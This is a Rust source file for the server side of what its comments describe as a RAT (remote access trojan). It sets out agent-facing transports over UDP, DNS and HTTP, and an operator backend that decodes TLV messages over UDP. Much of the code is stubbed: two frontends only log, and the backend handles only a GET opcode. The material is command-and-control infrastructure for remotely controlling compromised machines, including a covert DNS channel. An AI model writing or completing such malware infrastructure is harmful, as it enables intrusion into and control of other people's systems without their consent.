//! lib.rs --- server

//! Not exactly the most elegant design, but it gets the job
//! done. This is the server component of Poor Richard's Pet
//! Rat.
//!
//! First, some terminology.
//!
//! + *frontend* refers to the server <--> agent interface.
//! + *backend* refers to the server <--> client (operator) interface.
//!
//! There are currently *3* different transport methods available for
//! the frontend.
//!
//! + *UDP* datagrams (default)
//! + *DNS* packets
//! + *HTTP/S*
//!
//! These transports are conditionally compiled with feature
//! flags ("udp", "dns", "http").
//!
//! There is only *1* transport method available for the backend which
//! is raw *UDP* using a simple TLV message codec. It would be trivial
//! to implement other transports if needed, but I prefer this simple
//! message-based format which is quite flexible and can interop well
//! with a variety of tools. For example, see `client/pr2.el' which
//! provides an Emacs UI.
//!
//! The frontend and backend run independently in separate
//! threads. Each interface binds to a network socket and listens for
//! incoming packets for their assigned transport (UDP/etc). Packets
//! are decoded and dispatched to an appropriate handler which will
//! then issue a response if needed or continue processing packets.
//!
//! The packet handlers require certain resources such as database
//! access, encryption keys, etc to issue responses, so these
//! resources are shared between the transport threads. The `Service'
//! struct contains these resources and is wrapped in an `Arc'.

pub mod cfg;
pub mod db;
pub mod error;

#[cfg(feature = "udp")]
pub mod udp;

#[cfg(feature = "dns")]
pub mod dns;

#[cfg(feature = "http")]
pub mod http;

pub use cfg::Cfg;
pub use db::Pool;
pub use error::Error;

use proto::{api::op::OpCode ,codec::OpCodec};

use bytes::BytesMut;
use std::{io, net::SocketAddr, sync::Arc};
use tokio::net::UdpSocket;
use tokio_util::{
  codec::{Decoder, Encoder},
  udp::UdpFramed,
};

/// The server Frontend
#[derive(Clone, Debug)]
pub struct TxService {
  addr: SocketAddr,
  pool: Pool,
}

impl TxService {
  pub fn new(addr: SocketAddr, pool: Pool) -> TxService {
    TxService { addr, pool }
  }

  #[cfg(feature = "http")]
  pub async fn start_http(self) -> Result<(), Error> {
    let addr = self.addr;
    log::info!("http tx_service listening on: {}", &addr);
    let app_state = Arc::new(http::AppState::new(self));
    let routes = http::routes(app_state);
    warp::serve(routes).bind(addr).await;
    Ok(())
  }

  #[cfg(feature = "dns")]
  pub async fn start_dns(&self) -> Result<(), Error> {
    let addr = self.addr;
    log::info!("dns tx_service listening on: {}", &addr);
    Ok(())
  }

  #[cfg(feature = "udp")]
  pub async fn start_udp(&self) -> Result<(), Error> {
    let addr = self.addr;
    log::info!("udp tx_service listening on: {}", &addr);
    Ok(())
  }
}

/// The server Backend
#[derive(Debug)]
pub struct RxService {
  addr: SocketAddr,
  pool: Pool,
}

impl RxService {
  pub fn new(addr: SocketAddr, pool: Pool) -> RxService {
    RxService { addr, pool }
  }

  pub async fn start_rx(&self) -> Result<(), Error> {
    log::info!("udp rx_service binding on: {}", self.addr);
    let socket = UdpSocket::bind(self.addr).await?;
    let mut inf = UdpFramed::new(socket, OpCodec {});
    loop {
      let mut buf = &mut BytesMut::new();
      // wait for socket to be readable
      inf.get_ref().readable().await?;
      match inf.get_mut().try_recv_buf_from(&mut buf) {
        Ok((n, client)) => {
          buf.truncate(n);
          log::trace!("RX FROM {}", &client);
          match inf.codec_mut().decode(&mut buf) {
            Ok(Some(m)) => {
	      log::trace!("{m}");
	      let val = m.val();
	      match m.top() {
		OpCode::GET => {
		  let args = String::from_utf8(val).expect("failed to parse bytes as utf8 string");
		  log::trace!("args: {}", &args);
		},
		_ => log::error!("`nyi"),
	      }
            }
            Ok(None) => continue,
            // FIXME
            Err(e) => {
              log::error!("error during decode: {}", e);
              continue;
            }
          }
          continue;
        }
        Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
          continue;
        }
        Err(e) => {
          return Err(e.into());
        }
      }
    }
  }
}
